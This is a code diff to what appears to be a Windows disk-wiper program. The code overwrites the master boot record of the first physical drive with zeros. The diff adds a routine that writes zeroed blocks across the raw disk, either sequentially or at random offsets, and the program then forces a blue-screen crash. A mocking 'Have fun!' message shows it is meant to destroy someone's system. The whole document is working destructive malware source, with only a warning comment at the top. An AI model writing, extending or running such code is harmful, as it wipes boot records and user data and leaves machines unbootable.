@@ -5,16 +5,24 @@
 //DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU'RE DOING
 
 
-
-
 #include <stdio.h>
 #include <windows.h>
+#include <stdlib.h>
 #pragma comment(lib, "ntdll.lib")
 
 #define MBR_SIZE 512
 
-#define ZERO_DRIVE false
-#define ZERO_SIZE 0
+#define ZERO_DRIVE 1
+#define BLOCK_SIZE 512
+#define BLOCKS_TO_OW 16384
+//Size of 256gb drive
+#define MAX_OFFSET_L 0xFFFFFFFF;
+#define MAX_OFFSET_H 0x3F;
+//Overwrites sequentially
+#define MODE_FULL 0
+//Randomly chooses blocks to write to
+//Causes more file corruption
+#define MODE_RANDOM 0
 
 
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
@@ -37,8 +45,6 @@ void BlueScreen()
 bool OverwriteMBR()
 {
     DWORD bytes_read = 512;
-
-
     char* buffer = new char[MBR_SIZE];
     ZeroMemory(buffer, MBR_SIZE);
     HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
@@ -47,17 +53,56 @@ bool OverwriteMBR()
     return res;
 }
 
+bool WriteChunk(HANDLE handle, char* buffer, OVERLAPPED* ol)
+{
+    DWORD bytes_read = 512;
+    return WriteFile(handle, buffer, BLOCK_SIZE, &bytes_read, ol);
+}
+
 bool ZeroDrive()
 {
-    return 0;
+    HANDLE fhandle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+    char* buf = new char[BLOCK_SIZE];
+    ZeroMemory(buf,BLOCK_SIZE);
+    if (MODE_FULL)
+    {
+        for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
+        {
+            OVERLAPPED ol;
+            ol.hEvent = NULL;
+
+            ol.Offset = i * BLOCK_SIZE;
+            ol.OffsetHigh = i * BLOCK_SIZE;
+            WriteChunk(fhandle, buf, &ol);
+        }
+    }
+    else
+    {
+        for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
+        {
+            OVERLAPPED ol;
+            ol.hEvent = NULL;
+            ol.Offset = rand() % MAX_OFFSET_L;
+            ol.OffsetHigh = rand() % MAX_OFFSET_H;
+            WriteChunk(fhandle, buf, &ol);
+        }
+    }
+    CloseHandle(fhandle);
+    return 1;
 }
 
 int main()
 {
 
+
+    
     if (OverwriteMBR())
     {
         printf("Master Bootloader Overwrittten. \nHave fun! :^) \n");
+    }
+    if (ZERO_DRIVE)
+    {
+        ZeroDrive();
     }
     
     BlueScreen();
